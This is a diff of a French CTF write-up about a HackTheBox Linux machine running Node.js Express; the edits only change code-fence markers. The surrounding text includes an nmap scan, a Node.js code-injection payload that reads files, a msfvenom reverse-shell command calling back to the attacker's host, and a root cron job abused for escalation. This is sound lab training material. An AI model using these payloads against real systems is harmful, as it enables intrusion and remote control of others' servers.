@@ -15,13 +15,13 @@ En attendant la venue d'un nouveau CTF basé sur Windows sur [HackTheBox](https:
 
 J'ai commencé par le classique scan de ports Nmap, ici un peu plus poussé via l'utilisation de plus de scripts :  
 
-```plain
+```
 nmap -T5 --script safe -sC -sV -p- -A -oA scan 10.10.10.85
 ```
 
 La seule chose à retenir c'est la présence du port 3000 ouvert ainsi que de nombreux ports non filtrés, ce qui peut être utile pour la suite :  
 
-```plain
+```
 Not shown: 63272 closed ports, 2262 filtered ports
 PORT     STATE SERVICE VERSION
 3000/tcp open  http    Node.js Express framework
@@ -110,7 +110,7 @@ Pour les payloads intéressants on peut se baser [sur cette page](https://ckaran
 
 Ce qui nous retourne le contenu suivant :  
 
-```plain
+```
 .ICEauthority
 .Xauthority
 .bash_history
@@ -150,7 +150,7 @@ server.js
 
 On peut alors continuer en dumpant le contenu du premier flag avec le payload *;res.end(require('fs').readFileSync('Documents/user.txt'))* :  
 
-```plain
+```
 9a093cd22ce86b7f41db4116e80d0b0f
 ```
 
@@ -159,7 +159,7 @@ Title is undefined
 
 Lister les dossiers, lire des fichiers, c'est déjà pas mal mais on veut un vrai shell alors on dégaine *msfvenom* (aka *Il y a un payload pour ça*).  
 
-```plain
+```
 $ msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 --arch nodejs --platform nodejs -f raw
 No encoder or badchars specified, outputting raw payload
 Payload size: 797 bytes
@@ -170,13 +170,13 @@ On injecte ce payload et notre reverse shell minimaliste arrive :)
 
 On dispose d'un accès avec le compte *sun* :  
 
-```plain
+```
 uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
 ```
 
 Il y a deux fichiers intéressants dans le home de l'utilisateur :  
 
-```plain
+```
 sun@sun:~$ cat Documents/script.py
 print "Script is running..."
 
@@ -200,7 +200,7 @@ It is not my code fault, it's Javascript
 
 That was fast... Pour être sûr que j'avais suivi le chemin attendu j'ai retrouvé la ligne suivante dans le *crontab* de root :  
 
-```plain
+```
 */5 * * * * python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
 ```
 
